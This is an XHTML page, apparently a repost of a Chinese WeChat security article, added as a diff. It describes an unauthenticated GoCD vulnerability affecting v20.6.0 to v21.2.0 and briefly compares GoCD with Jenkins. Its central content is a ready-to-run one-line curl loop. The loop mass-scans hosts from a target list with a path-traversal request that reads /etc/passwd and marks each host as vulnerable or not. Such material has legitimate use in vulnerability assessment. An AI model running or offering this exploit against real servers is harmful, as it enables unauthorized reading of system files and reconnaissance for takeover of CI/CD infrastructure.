@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>一句话Poc之GoCD接管(RCE)漏洞（无需认证）</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>一句话Poc之GoCD接管(RCE)漏洞（无需认证）</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzkwNDI1NDUwMQ==&amp;mid=2247484949&amp;idx=1&amp;sn=00b7123b4d176841c528a39a2ab630f6&amp;chksm=c088835ff7ff0a49badd7e4f8b7dfe047c04b16a710f31efdb9b2c9996e90473c2d899c9b4ea&amp;scene=126&amp;sessionid=1681654904#rd">http://mp.weixin.qq.com/s?__biz=MzkwNDI1NDUwMQ==&amp;mid=2247484949&amp;idx=1&amp;sn=00b7123b4d176841c528a39a2ab630f6&amp;chksm=c088835ff7ff0a49badd7e4f8b7dfe047c04b16a710f31efdb9b2c9996e90473c2d899c9b4ea&amp;scene=126&amp;sessionid=1681654904#rd</a></blockquote><section style="font-size: 16px;"><p># GoCD</p><p><br/></p><p>GoCD是用Java 编写的热门 CI/CD 解决方案，是非政府组织和每年收入达数十亿的财富500强公司等大批用户的首选。GoCD 因此成为关键基础设施以及极受攻击者欢迎的目标。为自动化构建和发布流程，一款集中化的 CI/CD 解决方案可访问多种生产环境和私密的源代码库。</p><p><br/></p><p># 影响版本</p><p><br/></p><p>v20.6.0～v21.2.0</p><p><br/></p><p># 一句话Poc</p><p><br/></p><p>cat targets.txt | while read host do; do curl -sk --insecure "https://$host:8153/go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../etc/passwd"| grep "root:x" &amp;&amp; echo "$host VULN" || echo "$host NOT";done</p><p><br/></p><p><img data-ratio="1" data-type="jpg" data-w="auto" style="height: auto !important;" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/ZZc0TFxLh1ibiaL1O7n7hrmKJSrB6ia5DInYg0ywZGWlAq34DbFa0Fo5a0jgrIRCtAEhLk92Ikrs60sm6PktXR28g/640?wx_fmt=jpeg" src="../Images/0f54ff06b5d9666f9d7ac9a44b525e9f.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/ZZc0TFxLh1ibiaL1O7n7hrmKJSrB6ia5DInYg0ywZGWlAq34DbFa0Fo5a0jgrIRCtAEhLk92Ikrs60sm6PktXR28g/640?wx_fmt=jpeg"/></p><p><br/></p><p># 多说一句，GoCD对标Jenkins，功能类似</p><p><br/>Jenkins是一个持续集成工具, 而GoCD是一个持续部署工具。如果你正在或想要进行连续交付, 则应使用GoCD, 它是Jenkins的可靠替代方案。 GoCD适合初学者和在构建部署管道方面经验丰富的人士使用。如果你想利用大型插件目录来自动化各种操作, 那么Jenkins可能更适合你。</p><p><br/></p></section>
+        
+</body>
+</html>
